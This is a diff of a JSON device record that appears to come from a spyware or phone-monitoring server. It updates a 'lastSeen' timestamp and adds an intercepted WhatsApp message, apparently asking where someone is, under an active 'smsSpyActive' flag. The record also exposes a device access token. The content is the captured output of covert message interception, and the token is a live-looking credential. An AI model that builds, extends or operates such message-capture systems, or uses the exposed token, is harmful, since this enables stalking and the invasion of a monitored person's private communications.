@@ -4,7 +4,7 @@
     "deviceName": "HP-SANGEAN-6B64",
     "ownerUsername": "KUDANIL",
     "token": "3020da2f0f6d9f81513d32cd8944bd59",
-    "lastSeen": 1775158105030,
+    "lastSeen": 1775158123034,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-02T14:28:53.779Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "🤍",
+        "content": "Kmu di mna itu?",
+        "time": "03/04 02:28",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775158105677
+      },
       {
         "appName": "WhatsApp",
         "sender": "🤍",
